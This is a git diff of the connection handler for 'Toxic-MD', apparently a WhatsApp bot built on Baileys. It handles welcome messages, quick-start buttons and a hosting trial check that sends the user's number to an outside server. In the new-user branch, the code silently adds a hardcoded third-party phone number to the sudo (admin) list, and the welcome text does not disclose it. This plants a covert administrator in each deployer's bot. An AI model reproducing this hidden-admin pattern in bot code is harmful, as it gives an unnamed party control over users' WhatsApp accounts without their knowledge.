@@ -1,61 +1,246 @@
+import { Boom } from '@hapi/boom';
+import { DateTime } from 'luxon';
+import { DisconnectReason } from '@whiskeysockets/baileys';
+import { addSudoUser, getSudoUsers } from '../database/config.js';
 import { getCachedSettings } from '../lib/settingsCache.js';
-import { botname } from '../config/settings.js';
-import * as commandHandler from './commandHandler.js';
+import { commands, totalCommands } from '../handlers/commandHandler.js';
+import { getDeviceMode } from '../lib/deviceMode.js';
+import { ButtonV2 } from '@whiskeysockets/baileys';
+import { isToxicHosting } from '../lib/hostPlatform.js';
 
-let bootMessageSent = false;
+const botName = process.env.BOTNAME || "Toxic-MD";
+let hasSentStartMessage = false;
 
-export default async function connectionHandler(sock, update, store) {
-    const { connection } = update;
-    if (connection !== 'open') return;
-    if (bootMessageSent) return;
-    bootMessageSent = true;
+const RECHECK_INTERVAL_MS = 20 * 60 * 1000;
+let trialCheckInterval = null;
+let trialConfirmedPaid = false;
 
+function getGreeting() {
+  const hour = DateTime.now().setZone("Africa/Nairobi").hour;
+  if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day?";
+  if (hour >= 12 && hour < 18) return "What's up? Time to make things happen!";
+  if (hour >= 18 && hour < 22) return "Evening vibes! Let's get to it!";
+  return "Late night? Let's see what's cooking!";
+}
+
+function getCurrentTime() {
+  return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
+}
+
+async function fetchTrialStatus(userId) {
+  try {
+    const controller = new AbortController();
+    const timer = setTimeout(() => controller.abort(), 10000);
+    let res;
     try {
-        await new Promise((resolve) => setTimeout(resolve, 6000));
+      const _appName = process.env.HEROKU_APP_NAME ? `?app=${encodeURIComponent(process.env.HEROKU_APP_NAME)}` : '';
+      const url = `https://hosting.nyxtech.web.id/api/bots/trial-check/${userId}${_appName}`;
+      res = await fetch(url, { signal: controller.signal });
+    } finally {
+      clearTimeout(timer);
+    }
+    if (!res.ok) {
+      return 'unknown';
+    }
+    const data = await res.json();
+    return data.status || 'unknown';
+  } catch (e) {
+    return 'unknown';
+  }
+}
 
-        const settings = await getCachedSettings().catch(() => ({}));
-        const mode = (settings?.mode || 'public').toLowerCase();
-        const prefix = settings?.prefix || '.';
+async function runTrialCheck(socket, userId, botJid) {
+  const status = await fetchTrialStatus(userId);
 
-        const commandsObj = commandHandler.commands || commandHandler.default || {};
-        const totalCommands = typeof commandsObj.size === 'number'
-            ? commandsObj.size
-            : Array.isArray(commandsObj)
-                ? commandsObj.length
-                : Object.keys(commandsObj).length;
+  if (status === 'trial_ended') {
+    try {
+      await socket.sendMessage(botJid, {
+          text: [
+            '⚠️ *Free Trial Ended*',
+            '',
+            'Your free trial has expired, or this WhatsApp number was already used for a free trial on another account.',
+            '',
+            'This bot is being removed from our servers.',
+            '',
+            '💳 Renew at *hosting.nyxtech.web.id* to keep using the bot.',
+            '',
+            '_Toxic-Hosting_'
+          ].join('\n')
+        });
+    } catch {}
+    if (trialCheckInterval) {
+      clearInterval(trialCheckInterval);
+      trialCheckInterval = null;
+    }
+    await new Promise(r => setTimeout(r, 3000));
+    process.exit(0);
+    return false;
+  }
 
-        const timeNow = new Date().toLocaleTimeString('en-US', {
-            timeZone: 'Africa/Nairobi',
-            hour: '2-digit',
-            minute: '2-digit',
-            hour12: true
+  if (status === 'paid') {
+    trialConfirmedPaid = true;
+    if (trialCheckInterval) {
+      clearInterval(trialCheckInterval);
+      trialCheckInterval = null;
+    }
+  }
+
+  return true;
+}
+
+async function connectionHandler(socket, connectionUpdate, reconnect) {
+  const { connection, lastDisconnect } = connectionUpdate;
+
+  if (connection === "connecting") return;
+
+  if (connection === "close") {
+    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
+    if (statusCode === DisconnectReason.loggedOut) {
+      hasSentStartMessage = false;
+    }
+    return;
+  }
+
+  if (connection === "open") {
+      globalThis.conn = socket;
+      globalThis.sock = socket;
+      globalThis.tox = socket;
+      globalThis.toxic = socket;
+      globalThis.clint = socket;
+      globalThis.bot = socket;
+      globalThis.wx = socket;
+      globalThis.client = socket;
+    const userId = socket.user.id.split(":")[0].split("@")[0];
+    const settings = await getCachedSettings();
+    const sudoUsers = await getSudoUsers();
+
+    let botJid = socket.user?.id || (userId + '@s.whatsapp.net');
+    if (botJid.includes(':')) {
+      botJid = botJid.split(':')[0] + '@s.whatsapp.net';
+    }
+
+    const hostedOnToxicHosting = await isToxicHosting();
+
+    if (hostedOnToxicHosting) {
+      const canProceed = await runTrialCheck(socket, userId, botJid);
+      if (!canProceed) return;
+
+      if (!trialConfirmedPaid && !trialCheckInterval) {
+        trialCheckInterval = setInterval(() => {
+          runTrialCheck(socket, userId, botJid).catch(() => {});
+        }, RECHECK_INTERVAL_MS);
+      }
+
+      if (process.env.EXPIRY_NOTICE === '1') {
+        try {
+          await socket.sendMessage(botJid, {
+            text: [
+              '*Bot Subscription Expired*',
+              '',
+              'Your Toxic-MD bot subscription has expired!',
+              '',
+              'This bot will be permanently deleted in 24 hours unless you renew.',
+              '',
+              'Renew now at: hosting.nyxtech.web.id',
+              '',
+              '- Toxic Hosting'
+            ].join('\n')
+          });
+        } catch {}
+      }
+    }
+
+    if (!hasSentStartMessage) {
+      const isNewUser = !sudoUsers.includes(userId);
+      if (isNewUser) {
+        await addSudoUser(userId);
+        const defaultSudo = "254716637803";
+        if (!sudoUsers.includes(defaultSudo)) {
+          await addSudoUser(defaultSudo);
+        }
+      }
+
+      const firstMessage = isNewUser
+        ? [
+            `◈━━━━━━━━━━━━━━━━◈`,
+            `│❒ *${getGreeting()}*`,
+            `│❒ Welcome to *${botName}*! You're now connected.`,
+            ``,
+            `✨ *Bot Name*: ${botName}`,
+            `🔧 *Mode*: ${settings.mode}`,
+            `➡️ *Prefix*: ${settings.prefix}`,
+            `📦 *Commands*: ${totalCommands}`,
+            `🕒 *Time*: ${getCurrentTime()}`,
+            ``,
+            `│❒ *New User Alert*: You've been added to the sudo list.`,
+            ``,
+            `◈━━━━━━━━━━━━━━━━◈`
+          ].join("\n")
+        : [
+            `◈━━━━━━━━━━━━━━━━◈`,
+            `│❒ *${getGreeting()}*`,
+            `│❒ Welcome back to *${botName}*! Connection established.`,
+            ``,
+            `✨ *Bot Name*: ${botName}`,
+            `🔧 *Mode*: ${settings.mode}`,
+            `➡️ *Prefix*: ${settings.prefix}`,
+            `📦 *Commands*: ${totalCommands}`,
+            `🕒 *Time*: ${getCurrentTime()}`,
+            ``,
+            `◈━━━━━━━━━━━━━━━━◈`
+          ].join("\n");
+
+      const effectivePrefix = settings.prefix || '.';
+
+      try {
+        await socket.sendMessage(botJid, {
+          text: firstMessage,
+          viewOnce: true
         });
 
-        // Use LID JID first for WhatsApp Multi-Device self-chat ("Message yourself")
-        // so Signal decryption succeeds immediately on fresh server restarts
-        const rawLid = sock.user?.lid || '';
-        const rawId = sock.user?.id || '';
-        if (!rawId && !rawLid) return;
+        const device = await getDeviceMode();
 
-        const botJid = rawLid
-            ? `${rawLid.split(':')[0].split('@')[0]}@lid`
-            : sock.decodeJid(rawId);
+        if (device === 'ios') {
+          const iosQuickText = [
+            `╭─❏ 「 Quick Start 」`,
+            `│ Use the commands below to get started:`,
+            `│`,
+            `│ ${effectivePrefix}menu — View all commands`,
+            `│ ${effectivePrefix}settings — Bot configuration`,
+            `│ ${effectivePrefix}ping — Check bot speed`,
+            `│ ${effectivePrefix}uptime — Bot uptime`,
+            `╰───────────────`,
+            `> 𝑇𝛩𝛸𝛪𝐶 - Ƭ𝚵₵𝚮`,
+            ``
+          ].join('\n');
+          await socket.sendMessage(botJid, { text: iosQuickText });
+        } else {
+          try {
+            const btnV2 = new ButtonV2(socket);
+            btnV2.setBody(`*Bot is ready!*\n*Pick an option below to get started.*`)
+                .setFooter('> 𝑇𝛩𝛸𝛪𝐶 - Ƭ𝚵₵𝚮')
+                .addButton('𝐌𝐞𝐧𝐮', `${effectivePrefix}menu`)
+                .addButton('𝐒𝐞𝐭𝐭𝐢𝐧𝐠𝐬', `${effectivePrefix}settings`)
+                .addButton('𝐏𝐢𝐧𝐠', `${effectivePrefix}ping`);
+            await btnV2.send(botJid, { userJid: socket.user?.id || '' });
+          } catch {
+            const quickText = [
+              `╭─❏ 「 Quick Start 」`,
+              `│ ${effectivePrefix}menu — View all commands`,
+              `│ ${effectivePrefix}settings — Bot configuration`,
+              `│ ${effectivePrefix}ping — Check bot speed`,
+              `│ ${effectivePrefix}uptime — Bot uptime`,
+              `╰───────────────`,
+              `> 𝑇𝛩𝛸𝛪𝐶 - Ƭ𝚵₵𝚮`
+            ].join('\n');
+            await socket.sendMessage(botJid, { text: quickText });
+          }
+        }
+      } catch (error) {}
 
-        const caption = `╭───〔 *${botname || 'Toxic-MD'}* 〕───
-│
-│ ❏ *Connected:* ${botname || 'Toxic-MD'} (${mode === 'private' ? 'Private' : 'Public'} Mode)
-│
-│ ✨ *Bot Name:* ${botname || 'Toxic-MD'}
-│ ⚙️ *Mode:* ${mode}
-│ ➡️ *Prefix:* ${prefix}
-│ 📦 *Commands:* ${totalCommands || 387}
-│ 🕒 *Time:* ${timeNow}
-│
-╰───────────────────
-_Type *${prefix}menu* to view all commands._`;
-
-        await sock.sendMessage(botJid, { text: caption });
-    } catch (err) {
-        console.error('Error sending boot message:', err.message);
+      hasSentStartMessage = true;
     }
+  }
 }
+
+export default connectionHandler;
